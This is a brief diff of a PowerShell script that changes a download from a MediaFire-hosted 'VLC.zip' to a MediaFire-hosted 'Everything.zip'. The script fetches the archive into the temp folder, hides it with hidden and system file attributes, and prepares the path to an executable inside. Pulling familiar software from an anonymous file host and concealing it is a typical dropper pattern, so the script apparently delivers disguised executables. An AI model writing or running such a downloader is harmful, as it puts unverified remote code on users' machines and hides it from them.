@@ -1,8 +1,8 @@
-$zipUrl = "https://download1591.mediafire.com/aaes22auczfgw1ZOqksgTEXlcmDa9URdSgdvjk4RzuAnq1Hl3t3svMuKAD-D0DhTn197c3fpQLtE_50vgNU2cQRGVF9isPpp6JqI7M5THAZdriXPV9rokLXUziyN1LvJSDxcnhUy3OI2r4Ti-DTTkaE2jCAbZt61S54gB6QcVhMZwQ/4lei0zrdzn4vs0b/VLC.zip"
-$exeName = "vlc.exe"
+$zipUrl = "https://download856.mediafire.com/8ywmnzw7a9pgX7pqIZjIw6lBo5J0oyZaQarlHSNY5rYPUlE6CUDIwvt3Ut7pr2UjVu19sRD_5oo8V4a69sjv0jtGkbI4g-z5UmsOqufjqHq2JAcnVKMDa3CdKRjyy0ak-Si-W008Lu27JDTV75g61av8h60CCNioeB7rLQzcGj_tRQ/r1n5ki0h6ij6rjl/Everything.zip"
+$exeName = "Everything.exe"
 $tempFolder = [System.IO.Path]::GetTempPath()
-$zipFile = Join-Path $tempFolder "vlc.zip"
-$extractFolder = Join-Path $tempFolder "vlc"
+$zipFile = Join-Path $tempFolder "Everything.zip"
+$extractFolder = Join-Path $tempFolder "Everything"
 $exePath = Join-Path $extractFolder $exeName
 
 if (-Not (Test-Path $zipFile)) { Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile; & attrib +h +s $zipFile }
